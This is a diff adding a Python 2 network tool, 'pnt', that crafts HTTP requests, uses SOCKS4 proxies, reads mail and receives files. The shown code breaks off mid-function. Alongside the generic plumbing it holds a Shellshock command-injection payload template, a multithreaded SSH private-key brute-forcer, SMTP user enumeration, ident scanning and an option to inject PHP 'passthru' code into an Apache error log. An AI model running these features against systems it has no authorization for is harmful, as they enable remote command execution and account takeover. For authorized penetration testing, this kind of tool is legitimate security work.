@@ -1,0 +1,1321 @@
+#!/usr/bin/python2
+
+__DESC__ = """
+Python-based network library/tool: craft HTTP requests, chat with servers etc.
+"""
+
+__PROG__                                = 'pnt'
+__VER__                                 = '0.2.6 (apr.2015)'
+__AUTHOR__                              = 'Vlad-Ioan TOPAN (vtopan/gmail)'
+
+
+__CHANGELOG__ = """
+Major changes:
+
+0.2.2:      +support for raw HTTP requests
+0.2.4:      +support for SOCKS4a proxies
+            +log timestamp support
+0.2.5:      +basic socket connection support
+0.2.6:      first public release
+"""
+
+__TODO__ = '''
+* easy way to add headers:
+#if 'Accept-Encoding' not in headers:
+#    headers['Accept-Encoding'] = 'identity'
+#if 'Connection' not in headers:
+#    headers['Connection'] = 'close'
+
+'''
+
+
+#--- imports --------------------------------------------------------------------------------------#
+
+
+import argparse
+import subprocess
+import sys
+import re
+import os
+import collections
+import fcntl
+import errno
+
+import socket
+import ssl
+import SocketServer
+import urllib
+import urllib2
+import urlparse
+import BaseHTTPServer
+import httplib
+import poplib
+import imaplib
+import smtplib
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email import Encoders
+import mimetypes
+
+import struct
+import threading
+import signal
+import time
+import types
+import threading
+import glob
+import zlib
+
+
+#--- globals --------------------------------------------------------------------------------------#
+
+
+ARGS                                    = None
+
+URLS = {
+}
+
+
+RX = {
+    'sep':(r'[,; \t/\|]+',),
+    }
+for k in RX:
+    RX[k] = re.compile(*RX[k])
+
+DESCRIPTION = "%(__PROG__)s %(__VER__)s - %(__DESC__)s\n\nAuthor: %(__AUTHOR__)s\n" % globals()
+
+STDINOUT                                = '-'
+
+CONTENT_TYPES = {
+    'J':'application/json',
+    'F':'application/x-www-form-urlencoded',
+    'X':'text/xml',
+    }
+
+HTTP_METHODS = {
+    '1.0':['GET', 'POST', 'HEAD'],
+    '1.1':['OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT'],
+    }
+HTTP_METHOD_LIST = sorted(reduce(lambda x,y:x+y, HTTP_METHODS.values()))
+
+SHELLSHOCK_TEMPLATE = '() { :;}; /bin/bash -c "%s"'
+SHELLSHOCK_CHECK = SHELLSHOCK_TEMPLATE % 'echo XXXX_VULNERABLE_XXXX'
+
+STATUS = 'running...'
+
+RESUME = {}
+RESUME_FILENAME = '.pnt.resume'
+
+DEFAULT_CFG_SECTION = None
+
+PORT_BY_PROTO = {
+    'ident':113,
+    'https':443,
+    'ssh':22,
+    'imap':143,
+    'pop3':110,
+    'pop3s':995,
+    'smtp':25,
+    'fpush':8080,
+    }
+
+WORK = None
+
+# fpush
+
+FPUSH_HEADER_FORMAT1            = "<LLLH256sH"
+FPUSH_HEADER_FORMAT2            = "<LLLLH256sH"
+
+FPUSH_MAGIC1                    = 'FPSH'    # 0x48535046
+FPUSH_MAGIC2                    = 'FPS2'    # 0x32535046
+
+FP_FLG_ZLIB                     = 1
+
+SMTP_METHODS                    = ['EXPN', 'VRFY', 'RCPT']
+
+
+SOCKS_VERSION                   = 4
+SOCKS_CMD_CONNECT               = 1
+
+_SOCKS_REQ_BASE                 = 90
+SOCKS_REQ_GRANTED               = 90
+SOCKS_REQ_REJECTED              = 91
+SOCKS_REQ_FAILED_IDENTD         = 92
+SOCKS_REQ_INVALID_USERID        = 93
+
+SOCKS_REQ_TEXT = ['ok', 'rejected', 'failed identd', 'invalid userid']
+
+
+
+#--- SOCKS sockets --------------------------------------------------------------------------------#
+
+
+
+class SocksError(Exception):
+
+    def __init__(self, err):
+        super(SocksError, self).__init__('[SOCKS] ' + err)
+
+
+
+class SocksSocket(socket.socket):
+
+    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, proxy_addr=None,
+                proxy_port=None):
+        super(SocksSocket, self).__init__(family, type, proto)
+        self.proxy_addr = proxy_addr
+        self.proxy_port = proxy_port
+
+
+    def recvall(self, count):
+        data = ''
+        while count > 0:
+            chunk = self.recv(count)
+            if not chunk:
+                raise SocksError('recvall() received 0 bytes (after %d of %d)!' % (len(data),
+                        len(data) + count))
+            data += chunk
+            count -= len(chunk)
+        return data
+
+
+    def connect(self, address):
+        if self.proxy_addr:
+            if not self.proxy_port:
+                raise ValueError('If a proxy address is set, a port must also be set!')
+        log('[SOCKS] Connecting to SOCKS server [%s:%d]...' % (self.proxy_addr, self.proxy_port), 1)
+        try:
+            super(SocksSocket, self).connect((self.proxy_addr, self.proxy_port))
+        except socket.error, e:
+            raise SocksError('Failed connecting to proxy server [%s:%d]: %s!' % (self.proxy_addr,
+                    self.proxy_port, str(e)))
+        addr, port = address
+        connect = struct.pack('>BBH', SOCKS_VERSION, SOCKS_CMD_CONNECT, port) \
+                + socket.inet_aton(addr) + '\0'
+        # [todo] add user/password support?
+        self.sendall(connect)
+        res = self.recvall(8)
+        _, err, dport, daddr = struct.unpack('>BBH4s', res)
+        daddr = socket.inet_ntoa(daddr)
+        err -= _SOCKS_REQ_BASE
+        if not (0 <= err < len(SOCKS_REQ_TEXT)):
+            raise SocksError('Invalid SOCKS reply code: %d!' % (err + _SOCKS_REQ_BASE))
+        log('[SOCKS] Connected to [%s:%d] => %s' % (addr, port, SOCKS_REQ_TEXT[err]))
+        if err != 0:
+            raise SocksError('Connect request for [%s:%d] failed: [%s]!' % (addr, port,
+                    SOCKS_REQ_TEXT[err]))
+
+
+
+def socks_socket_constructor(addr, port):
+    def constructor(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0):
+        return SocksSocket(family=family, type=type, proto=proto, proxy_addr=addr, proxy_port=port)
+    return constructor
+
+
+
+#--- Work threads ---------------------------------------------------------------------------------#
+
+
+
+class WorkThread(threading.Thread):
+
+
+    def __init__(self, id_, work):
+        self.id = id_
+        self.work = work
+        self.done = 0
+        super(WorkThread, self).__init__()
+
+
+    def run(self):
+        while 1:
+            arg = self.work.get_work()
+            if not arg:
+                log('[WORK] Thread %d stopped (no more work).' % self.id, 1)
+                break
+            if self.work.do_work(arg):
+                log('[WORK] Thread %d stopped (work failed).' % self.id, 1)
+                break
+        self.done = 1
+
+
+
+class Work(object):
+
+
+    def __init__(self, name, fun_do_work, get_work, fun_done=None, ctx=None, total=None):
+        """
+        fun_do_work(arg): function which works on an item; return True when to stop thread.
+        fun_done: called when all work is done.
+        get_work:
+        total = number of work items
+        """
+        self.name = name
+        self._get_work = get_work
+        self._fun_done = fun_done
+        self._fun_do_work = fun_do_work
+        self.ctx = ctx if ctx != None else {}
+        self.total = total
+
+        self.log_interval = 20
+        self.stop_work = 0
+        self.done = 0
+        self.start_time = time.time()
+        self.last_logged = self.start_time
+        self.threads = []
+        self.pending_items = []
+        self.done_items = []
+        self.last_item = None
+
+
+    def get_work(self):
+        if self.stop_work:
+            return None
+        if type(self._get_work) == types.ListType:
+            if self._get_work:
+                item = self._get_work.pop(0)
+            else:
+                item = None
+        else:
+            item = self._get_work()
+        if item != None:
+            self.pending_items.append(item)
+        return item
+
+
+    def do_work(self, arg):
+        res = self._fun_do_work(self.ctx, arg)
+        if res:
+            return 1
+        else:
+            # work done successfully
+            if self.pending_items[0] == arg:
+                self.last_item = self.pending_items.pop(0)
+            else:
+                self.done_items.append(arg)
+            self.done += 1
+
+
+    def check_pending(self):
+        if self.done_items:
+            copy = sorted(self.done_items)
+            while copy:
+                e = copy.pop(0)
+                if self.pending_items[0] == e:
+                    self.last_item = self.pending_items.pop(0)
+                    self.done_items.remove(e)
+                else:
+                    break
+
+
+    def log_status(self):
+        if self.done:
+            took = time.time() - self.start_time
+            percent = ''
+            if self.total:
+                percent = 'of %s (%.2f%%) ' % (self.total, 100. * self.done / self.total)
+            log('[WORK] - done %d %sin %.2fs => %.2fs/item; %d threads left.' % (self.done,
+                    percent, took, took / self.done, len(self.threads)))
+        self.last_logged = time.time()
+
+
+    def start(self):
+        log('[WORK] Starting %d threads for [%s]...' % (ARGS.threads, self.name.replace('_', '-')))
+        for i in xrange(ARGS.threads):
+            t = WorkThread(i, self)
+            self.threads.append(t)
+            t.start()
+        self.wait(_main=1)
+
+
+    def wait(self, _main=0):
+        """ _main is for internal use only. """
+        while self.threads:
+            if time.time() - self.last_logged > self.log_interval:
+                self.log_status()
+            for t in self.threads:
+                if t.done:
+                    self.threads.remove(t)
+            if _main:
+                self.check_pending()
+            if self.threads:
+                time.sleep(0.3)
+
+
+    def stop(self):
+        log('Stopping %d threads...' % len(self.threads))
+        self.stop_work = 1
+        self.wait()
+        log('Saving restore point [%s]: [%s]' % (self.name, self.last_item))
+        save_point(self.name, self.last_item)
+        if self._fun_done:
+            self._fun_done()
+
+
+
+#--- Replacement TCP server -----------------------------------------------------------------------#
+
+
+
+class NoWaitTCPServer(SocketServer.TCPServer):
+
+
+    def server_bind(self):
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.bind(self.server_address)
+
+
+
+#--- FPush server ---------------------------------------------------------------------------------#
+
+
+
+class FPushServer(SocketServer.BaseRequestHandler):
+
+
+    def handle(self):
+        magic = self.request.recv(4)
+        ver = 1
+        flags = 0
+        if magic == FPUSH_MAGIC1:
+            fmt = FPUSH_HEADER_FORMAT1
+            log('[*] Received v1 header...')
+        elif magic == FPUSH_MAGIC2:
+            fmt = FPUSH_HEADER_FORMAT2
+            log('[*] Received v2 header...')
+            ver = 2
+        else:
+            raise ValueError('[!] Invalid magic [%s]!' % magic.encode('hex'))
+        data = self.request.recv(struct.calcsize(fmt))
+        values = struct.unpack(fmt, data)
+        if ver == 1:
+            csize, fnlen, datalen, _1, filename, _2 = values
+        else:
+            csize, fnlen, datalen, flags, _1, filename, _2 = values
+        filename = filename[:fnlen]
+        fn = os.path.join(ARGS.local_path, os.path.basename(filename))
+        if os.path.isfile(fn):
+            log('[!] WARNING: overwriting [%s]...' % fn)
+        log('[*] Receiving [%s] (%d bytes, ~%.1f MB)... ' % (filename, datalen, datalen / 1024. / 1024),
+                crlf=0)
+        h = open(fn, 'wb')
+        logchunk = 0
+        while datalen > 0:
+            data = self.request.recv(csize)
+            if not data:
+                log('[*] Failed reading data!')
+                return
+            datalen -= len(data)
+            logchunk += len(data)
+            if logchunk > 100*1024:
+                log('.', crlf=0)
+                logchunk = 0
+            h.write(data)
+        h.close()
+        log('\n[*] Received [%s]' % (filename,))
+        if flags & FP_FLG_ZLIB:
+            data = zlib.decompress(open(fn, 'rb').read())
+            open(fn, 'wb').write(data)
+            log('[*] Decompressed [%s] to %d bytes.' % (fn, len(data),))
+
+
+
+#--- generic functions + init() -------------------------------------------------------------------#
+
+
+
+def out(data):
+    if ARGS.output == STDINOUT:
+        sys.stdout.write(data)
+    elif ARGS.output == '@':
+        pass
+    else:
+        open(ARGS.output, 'ab').write(data)
+
+
+LOG_IS_AFTER_CRLF = True
+def log(s, v=0, crlf=True):
+    global LOG_IS_AFTER_CRLF
+    if ARGS.log_timestamps and LOG_IS_AFTER_CRLF:
+        s = time.strftime('[%Y%m%d-%H%M%S] ') + s
+    if v <= ARGS.verbose:
+        sys.stderr.write(s + ('\n' if crlf else ''))
+        sys.stderr.flush()
+    STATUS = s
+    LOG_IS_AFTER_CRLF = crlf
+
+
+def err(s):
+    log('ERROR: ' + s)
+
+
+def dbg(s):
+    log('[DBG] ' + s, v=1)
+
+
+def die(s):
+    err(s)
+    sys.exit(1)
+
+
+def warn(s):
+    log('WARNING: ' + s)
+
+
+def handle_keyboard(fun):
+    KeyboardHandler(fun).start()
+
+
+def load_cfg(filename, empty_on_error=True):
+    cfg = {}
+    if not os.path.isfile(filename):
+        return cfg
+    section = DEFAULT_CFG_SECTION
+    cfg[section] = {}
+    for line in open(filename):
+        line = line.lstrip()
+        if not line or line[0] == '#':
+            continue
+        if line[0] == '[':
+            section = line.strip('[]')
+            if section not in cfg:
+                cfg[section] = {}
+            continue
+        if '=' not in line:
+            if empty_on_error:
+                return {}
+            else:
+                raise ValueError('Invalid contents of [%s] in line [%s]!' % (filename, line))
+        k, v = tuple([x.strip() for x in line.split('=', 1)])
+        cfg[section][k] = v
+    return cfg
+
+
+def save_point(k, v, msg=None):
+    if msg:
+        log(msg, 2)
+    open(RESUME_FILENAME, 'wb').write('%s = %s' % (k, v))
+
+
+def do_work(*args, **kargs):
+    global WORK
+    WORK = Work(*args, **kargs)
+    WORK.start()
+
+
+
+#--- Library functions ----------------------------------------------------------------------------#
+
+
+
+def http_request(host, path='/', data=None, proto='http', method='GET', headers=None, port=80,
+            user=None, password=None):
+    url = ('%s://%s%s%s' % (proto, host, '' if port == 80 else (':%s' % port), path))
+    log('[HTTP/%s] Requesting URL [%s] (with %d byte(s) of data)...' % (method, url, len(data or '')))
+    if headers and ARGS.verbose >= 2:
+        log('[HTTP] Request headers:', 2)
+        for k, v in headers.items():
+            log('%s: %s' % (k, v), 2)
+        log('[HTTP] ---end-of-request-headers-' + '-'*40)
+    error = 0
+    # perform a HTTP request
+    if ARGS.raw_requests:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((host, port))
+        except Exception, e:
+            die('[HTTP] Failed connecting to [%s:%d]!\n%s' % (host, port, str(e)))
+        if proto == 'https':
+            s = ssl.wrap_socket(s)
+        elif proto != 'http':
+            s.close()
+            die('[HTTP] Unsupported protocol [%s] for raw requests!' % proto)
+        s.settimeout(ARGS.timeout)
+        if data != None:
+            if 'Content-Length' not in headers:
+                headers['Content-Length'] = str(len(data))
+            if 'Content-Type' not in headers:
+                headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        if 'Host' not in headers:
+            headers['Host'] = host
+            if port != 80:
+                headers['Host'] += ':%s' % port
+        if user and password:
+            headers['Authorization'] = 'Basic %s' % ('%s:%s' % (user, password)).encode('base64').strip()
+        hdrs = 'Host: %s\r\n' % headers['Host']
+        del headers['Host']
+        hdrs += ''.join('%s: %s\r\n' % e for e in headers.items())
+        req = '%s %s HTTP/1.1\r\n%s\r\n%s' % (method, path or '/',
+                hdrs,
+                data or '')
+        if ARGS.verbose_requests or ARGS.verbose >= 3:
+            log('[HTTP] Raw request:\n%s\n%s' % (req, '-' * 50))
+        s.sendall(req)
+        resp = ''
+        hdrs = clen = hdrsize = None
+        hsep = '\r\n'
+        while 1:
+            try:
+                if clen and len(resp) >= clen + hdrsize:
+                    break
+                try:
+                    r = s.recv(4096)
+                except socket.error, e:
+                    err('[HTTP] recv() failed: %s! Partial data:' % str(e))
+                    out(resp)
+                    code = e[0]
+                    if code != errno.ECONNRESET:
+                        raise
+                if not r:
+                    break
+                resp += r
+                if (not hdrs) and '\n' in resp:
+                    if not '\r\n' in resp:
+                        hsep = '\n'
+                    hdrs = resp.split(2 * hsep, 1)[0]
+                    hdrsize = len(hdrs + 2 * hsep)
+                    m = re.search('Content-Length: (\d+)', hdrs)
+                    if m:
+                        clen = int(m.groups()[0])
+                        dbg('Got Content-Length = %d' % clen)
+            except socket.timeout:
+                err('[HTTP] Timed out after receiving %d bytes from [%s]!' % (len(resp), url))
+                if resp:
+                    out('[HTTP] Partial data:')
+                    out(resp)
+                sys.exit()
+        if hdrs == None:
+            hdrs = resp
+            resp = ''
+        body = resp.split(2 * hsep, 1)[1] if (2 * hsep) in resp else ''
+        log('[HTTP] Raw response:\n%s\n[HTTP] ---end-raw-response-%s' % (resp, '-' * 40), 4)
+        result = body
+        if not hdrs.strip():
+            die('[HTTP] Empty response!')
+        try:
+            hdr, hdrs = tuple(hdrs.split(hsep, 1))
+        except:
+            raise ValueError('[HTTP] Invalid HTTP response header: [%s]!' % hdrs)
+        if not hdr.startswith('HTTP/'):
+            die('[HTTP] Invalid HTTP response:\n%s' % resp)
+        hproto, http_code, reason = tuple(hdr.split(' ', 2))
+        long_reason = reason
+        http_code = int(http_code)
+        reshdr = {}
+        for e in hdrs.split(hsep):
+            if not e.strip():
+                continue
+            k, v = tuple(e.split(': ', 1))
+            reshdr[k] = v
+        s.close()
+        if http_code == 302 and 'Location' in reshdr:
+            log('[HTTP] Redirected (302) to Location [%s] => [%s]' % (reshdr['Location'],
+                    urlparse.urljoin(url, reshdr['Location'])))
+    else:
+        if user and password:
+            pwmgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
+            pwmgr.add_password(None, '%s://%s' % (proto, host), user, password)
+            handler = urllib2.HTTPBasicAuthHandler(pwmgr)
+        else:
+            handler = urllib2.HTTPHandler
+        opener = urllib2.build_opener(handler)
+        request = urllib2.Request(url + path, data=data)
+        if headers:
+            for k, v in headers.items():
+                request.add_header(k, v)
+        request.get_method = lambda:method
+        body = ''
+        http_code = 200
+        reason = ''
+        long_reason = ''
+        try:
+            h = opener.open(request, timeout=ARGS.timeout)
+            body = h.read()
+            reshdr = h.info()
+        except urllib2.HTTPError, e:
+            http_code = e.code
+            reason = e.reason
+            long_reason = BaseHTTPServer.BaseHTTPRequestHandler.responses[e.code][1]
+            reshdr = None
+        except socket.timeout, e:
+            http_code = 598
+            reason = '<timeout-reached:%ss>' % ARGS.timeout
+            long_reason = reason
+            reshdr = None
+    return (error, http_code, body, reshdr, (reason, long_reason))
+
+
+def port_range(s):
+    # extract a port range from string s (examples: 1 or 3,4,6 or 90-100)
+    if '-' in s:
+        left, right = tuple([int(x) for x in s.split('-')])
+        res = xrange(left, right + 1)
+    elif ',' in s:
+        res = [int(i) for i in s.split(',')]
+    else:
+        res = [int(s)]
+    return res
+
+
+def socket_sendrecv(s, msg, recvsize=1024, section='SOCK'):
+    log('[%s] Send: %s' % (section, msg.strip()), 1)
+    s.sendall(msg)
+    msg = s.recv(recvsize)
+    log('[%s] Recv: %s' % (section, msg.strip()), 1)
+    return msg
+
+
+def form_escape(s):
+    return urllib.quote(s, '/').replace(' ', '%20')
+
+
+
+#--------------------------------------------------------------------------------------------------#
+
+
+
+def ssh_try_keyfile(ctx, filename):
+    user = ctx['user']
+    port = ctx['port']
+    host = ctx['host']
+    log("[SSH-KEY] - trying key [%s]..." % filename, 3)
+    cmd = ['ssh', '-i', filename, '%s@%s' % (user, host), '-o', 'PasswordAuthentication=no',
+            '-o', 'ConnectTimeout=%d' % ARGS.timeout, 'id']
+    if port != 22:
+        cmd.append('-p %s' % port)
+    for attempt in xrange(3):
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        res = p.wait()
+        so = (p.stdout.read() + '\n' + p.stderr.read()).strip() or '<no-result>'
+        if res == 0:
+            log("[SSH-KEY] Found working private key [%s]:\n%s" % (filename, so))
+            log("[SSH-KEY] Use this command to log in:\nssh -i '%s' -p %s -o PasswordAuthentication=no '%s@%s'" % (filename,
+                    port, user, host))
+            WORK.stop()
+            return 1
+        if 'Permission denied' in so:
+            return 0
+        if WORK.stop_work:
+            return 1
+        log('[SSH-KEY] Unknown SSH response:\n%s' % so.strip())
+        time.sleep(5)
+        continue
+    log('[SSH-KEY] Three consecutive errors; giving up.')
+    return 1
+
+
+def run_tool():
+    global ARGS
+    global paramiko
+
+    parser = argparse.ArgumentParser(prog=__PROG__, description=DESCRIPTION,
+                epilog='\nNote: use @@data@@ in the URL to have it replaced with URL-encoded data')
+    # generic args
+    parser.add_argument("--ver", "--version", help="print version", action='store_true')
+    # target(s)
+    parser.add_argument("hosts", help="remote host(s) (may contain colon-separated port)",
+            nargs='*')
+    # # ops
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("-xh", "--http-request", help="HTTP request", action='store_true')
+    group.add_argument("-xrt", "--robots-txt", help="read robots.txt from server",
+            action='store_true')
+    group.add_argument("-xxml", "--xml-rpc-request",
+            help="XML RPC request (pass method and space-separated list of param=value); pass ? " \
+            + "to list known methods", nargs='*')
+    group.add_argument("-xcs", "--check-shellshock", help="check for shellshock",
+            action='store_true')
+    group.add_argument("-xc", "--connect", help="connect to TCP socket", action='store_true')
+    group.add_argument("-xl", "--listen", help="listen on TCP socket", action='store_true')
+    group.add_argument("-xpop3", "--pop3", help="get POP3 mail(s) from server (default port 110)",
+            action='store_true')
+    group.add_argument("-xpop3s", "--pop3-ssl",
+            help="get POP3 SSL mail(s) from server (default port 995)", action='store_true')
+    group.add_argument("-ximap", "--imap4", help="get IMAP v4 mail(s) from server (default port 143)",
+            action='store_true')
+    group.add_argument("-xpei", "--php-error-inject",
+            help="inject a <?php passthru...> in the apache error log", action='store_true')
+    group.add_argument("-xid", "--ident-scan",
+            help="get the user of a remote port/range of ports (e.g. 1-100)", nargs='*',
+            action='store')
+    group.add_argument("-xsshk", "--brute-force-ssh-key",
+            help="use keys from a path (glob or folder) to attempt SSH login", nargs=1,
+            action='store')
+    group.add_argument("-xmail", "-xsmtp", "--mail", help="send SMTP mail (see the --mail-* args)",
+            action='store_true')
+    group.add_argument("-xfp", "--fpush", help="run fpush server (default port 8080)",
+            action='store_true')
+    group.add_argument("-xsmtpu", "--smtp-users",
+            help="check if SMTP users exist (data is a comma/colon/CRLF-separated list)",
+            action='store_true')
+
+    group.add_argument("-lm", "--list-methods", help="print a list of HTTP methods",
+            action='store_true')
+
+    # generic flags
+    parser.add_argument("-i", "--input", default=None,
+            help="input data source (filename or - for stdin)")
+    parser.add_argument("-I", "--raw-input", help="raw input data")
+    parser.add_argument("-o", "--output", default='-',
+            help="output filename (- for stdout/default, @ for no output)")
+    parser.add_argument("-v", "--verbose", help="increase output verbosity", default=0,
+            action="count")
+    parser.add_argument("-NR", "--no-resume", help="don't resume (when possible)",
+            action="store_true")
+    parser.add_argument("--proto",
+            help="protocol (http|ssh|pop3|imap|...); can be automatically guessed", default=None)
+    parser.add_argument("-T", "--threads", default=3, help="number of threads (where applicable)",
+            type=int)
+    parser.add_argument("-lt", "--log-timestamps", help="prefix log with timestamps",
+            action="store_true")
+
+    # specific flags
+    parser.add_argument("-R", "--raw-requests", help="disable raw (HTTP) requests (use urllib2)",
+            action="store_false")
+    parser.add_argument("-m", "--http-method", default='GET', help="HTTP method",
+            choices=HTTP_METHOD_LIST)
+    parser.add_argument("-ct", "--content-type", default=None, help="content type (J=JSON)")
+    parser.add_argument("-c", "--count", default=None,
+            help="number of bytes to display/save from responses", type=int)
+    parser.add_argument("-u", "--user", help="user (default: root)", default=None)
+    parser.add_argument("-p", "--password", help="password", default=None)
+    parser.add_argument("-lp", "--local-port", help="local port (default depends on protocol)",
+            default=None)
+    parser.add_argument("-rp", "--remote-port", help="remote port (default depends on protocol)",
+            default=None)
+    parser.add_argument("-lP", "--local-path", help="local path", default='.')
+    parser.add_argument("-rP", "--remote-path", help="remote path", default='/')
+    parser.add_argument("-lh", "--local-host", help="local host to listen on (default 0.0.0.0)",
+            default="0.0.0.0")
+    parser.add_argument("-V", "--verbose-requests", action="store_true")
+    parser.add_argument("-Q", "--quote-full", help="HTTP-quote data (fully)", action="store_true")
+    parser.add_argument("-QP", "--quote-params",
+            help="HTTP-quote data as params (split by & and quote individually)", action="store_true")
+    parser.add_argument("-acl", "--add-content-length", help="add Content-Length header")
+    parser.add_argument("-aua", "--add-user-agent", help="add User-Agent header")
+    parser.add_argument("-ah", "--add-http-header", help="add HTTP request header", default=[],
+            action='append')
+    parser.add_argument("-C", "--command", help="command to execute (shellshock)", default=None)
+    parser.add_argument("-t", "--timeout", help="timeout (in seconds, default 10)", default=10,
+            type=int)
+    parser.add_argument("-P", "--proxy", help="SOCKS4 proxy to go through (ADDR:PORT format)",
+            default=None)
+    parser.add_argument("--mail-from", help="mail From header", default=None)
+    parser.add_argument("--mail-to", help="mail To header", default=None)
+    parser.add_argument("--mail-subject", help="mail Subject header", default=None)
+    parser.add_argument("--mail-attach", help="attach file (to mail)", default=None)
+    parser.add_argument("--smtp-method", help="SMTP command used to check if SMTP users exist",
+            choices=SMTP_METHODS)
+    parser.add_argument("--smtp-domain", help="SMTP domain used to check if SMTP users exist",
+            default=None)
+
+    ARGS = parser.parse_args()
+
+    if ARGS.ver:
+        log('%s ver. %s (C) %s, 2015' % (__PROG__, __VER__, __AUTHOR__))
+        sys.exit()
+
+    if ARGS.list_methods:
+        log(', '.join(HTTP_METHOD_LIST))
+        sys.exit()
+
+    if ARGS.output not in '-@':
+        open(ARGS.output, 'wb').close()
+
+    # what to do
+    if not (ARGS.ident_scan or ARGS.php_error_inject or ARGS.pop3 or ARGS.pop3_ssl or ARGS.imap4 \
+                or ARGS.http_request or ARGS.xml_rpc_request \
+                or ARGS.robots_txt or ARGS.list_methods or ARGS.check_shellshock \
+                or ARGS.brute_force_ssh_key or ARGS.mail or ARGS.smtp_users) \
+            and ARGS.hosts:
+        ARGS.http_request = True
+    elif not (ARGS.hosts or ARGS.fpush):
+        err('No arguments! Pass -h for help.')
+        log('%s ver. %s (C) %s, 2015' % (__PROG__, __VER__, __AUTHOR__))
+        sys.exit()
+
+    if ARGS.no_resume:
+        if os.path.isfile(RESUME_FILENAME):
+            os.remove(RESUME_FILENAME)
+    elif os.path.isfile(RESUME_FILENAME):
+        resume = load_cfg(RESUME_FILENAME, empty_on_error=True)
+        if not resume:
+            warn('Invalid/empty resume file!')
+            os.remove(RESUME_FILENAME)
+        RESUME.update(resume[DEFAULT_CFG_SECTION])
+
+    if ARGS.verbose_requests:
+        old_send = httplib.HTTPConnection.send
+        def new_send(self, data):
+            log('[HTTP] Send:\n%s' % data)
+            return old_send(self, data)
+        httplib.HTTPConnection.send = new_send
+
+    if ARGS.check_shellshock:
+        ARGS.raw_requests = 1
+
+    # get input
+    if ARGS.http_request or ARGS.check_shellshock or ARGS.mail or ARGS.smtp_users:
+        if ARGS.raw_input != None:
+            data = ARGS.raw_input
+        elif ARGS.input == STDINOUT:
+            data = sys.stdin.read()
+        elif ARGS.input:
+            data = open(ARGS.input, 'rb').read()
+        else:
+            #raise ValueError('No input data!')
+            data = None
+        if data:
+            if ARGS.quote_full:
+                data = form_escape(data)
+            elif ARGS.quote_params:
+                parts = data.split('&')
+                part_list = []
+                for p in parts:
+                    if '=' in p:
+                        part_list.append('='.join([form_escape(x) for x in p.split('=', 1)]))
+                    else:
+                        part_list.append(form_escape(p))
+                data = '&'.join(part_list)
+
+    # get local port
+    ARGS.local_port = ARGS.local_port and int(ARGS.local_port)
+    if not ARGS.local_port:
+        if ARGS.fpush:
+            ARGS.local_port = PORT_BY_PROTO.get('fpush')
+        else:
+            ARGS.local_port = 80
+
+    # proxy
+    if ARGS.proxy:
+        addr, port = tuple(ARGS.proxy.split(':'))
+        socket.socket = socks_socket_constructor(addr or 'localhost', int(port))
+
+    if ARGS.brute_force_ssh_key:
+        path = ARGS.brute_force_ssh_key[0]
+        if '*' in path:
+            bf_ssh_filenames = [x for x in glob.glob(path) if not x.endswith('.pub')]
+        else:
+            bf_ssh_filenames = []
+            for root, dirs, files in os.walk(path):
+                for f in files:
+                    if not f.endswith(".pub"):
+                        bf_ssh_filenames.append(os.path.join(root, f))
+        bf_ssh_filenames = sorted(bf_ssh_filenames)
+        if RESUME.get('brute_force_ssh_key', None):
+            if RESUME['brute_force_ssh_key'] not in bf_ssh_filenames:
+                os.remove(RESUME_FILENAME)
+            else:
+                bf_ssh_filenames = bf_ssh_filenames[bf_ssh_filenames.index(RESUME['brute_force_ssh_key']):]
+
+    if ARGS.fpush:
+        ARGS.local_path = ARGS.local_path.rstrip('/\\')
+        if not os.path.isdir(ARGS.local_path):
+            print('[FPUSH] Creating folder [%s]...' % ARGS.local_path)
+            os.makedirs(ARGS.local_path)
+        print('[FPUSH] Listening on [%s:%s]...' % (ARGS.local_host, ARGS.local_port))
+        server = NoWaitTCPServer((ARGS.local_host, ARGS.local_port), FPushServer)
+        server.serve_forever()
+        sys.exit()
+
+    for host in ARGS.hosts:
+
+        headers = collections.OrderedDict()
+
+        # method
+        method = ARGS.http_method
+
+        # proto
+        proto = ARGS.proto
+        if '://' in host:
+            proto, host = tuple(host.split('://', 1))
+        elif ARGS.brute_force_ssh_key:
+            proto = 'ssh'
+        elif ARGS.ident_scan:
+            proto = 'ident'
+        elif ARGS.imap4:
+            proto = 'imap'
+        elif ARGS.pop3:
+            proto = 'pop3'
+        elif ARGS.pop3_ssl:
+            proto = 'pop3s'
+        elif ARGS.mail or ARGS.smtp_users:
+            proto = 'smtp'
+        if not proto:
+            proto = 'http'
+
+        # path
+        path = ARGS.remote_path
+        if '/' in host:
+            host, path = tuple(host.split('/', 1))
+        elif '?' in host:
+            host, path = tuple(host.split('?', 1))
+            path = '?' + path
+        if path:
+            if not path.startswith('/'):
+                path = '/' + path
+        if '@@data@@' in path:
+            path = path.replace('@@data@@', data)
+
+        # user, password
+        user = ARGS.user
+        password = ARGS.password
+        if '@' in host:
+            user, host = tuple(host.split('@'))
+            if ':' in user:
+                user, password = tuple(user.split(':'))
+        if user == None:
+            user = 'root'
+
+        # port
+        port = ARGS.remote_port and int(ARGS.remote_port)
+        if ':' in host:
+            host, port = tuple(host.split(':'))
+            port = int(port)
+        if not port:
+            port = PORT_BY_PROTO.get(proto, 80)
+
+        # email stuff
+        if ARGS.pop3 or ARGS.pop3_ssl or ARGS.imap4:
+            pname = 'IMAP' if ARGS.imap4 else 'POP3'
+            args = (host, port, ARGS.timeout)
+            if ARGS.imap4:
+                f = imaplib.IMAP4
+                args = (host, port)
+            elif ARGS.pop3:
+                f = poplib.POP3
+            else:
+                f = poplib.POP3_SSL
+            log('[%s] Connecting to [%s:%s]...' % (pname, host, port))
+            conn = f(*args)
+
+            if ARGS.imap4:
+                log('[%s] Logging in as [%s]:[%s]...' % (pname, user, password))
+                conn.login(user, password)
+                conn.select()
+                typ, data = conn.search(None, 'ALL')
+                for num in data[0].split():
+                    typ, data = conn.fetch(num, '(RFC822)')
+                    fn = 'mail#%s-%s-%s-%s.eml' % (num, user, host, port)
+                    data = str(data)
+                    log('[%s] Message %s (%d bytes) -> %s' % (pname, num, len(data), fn))
+                    open(fn, 'wb').write(data)
+                else:
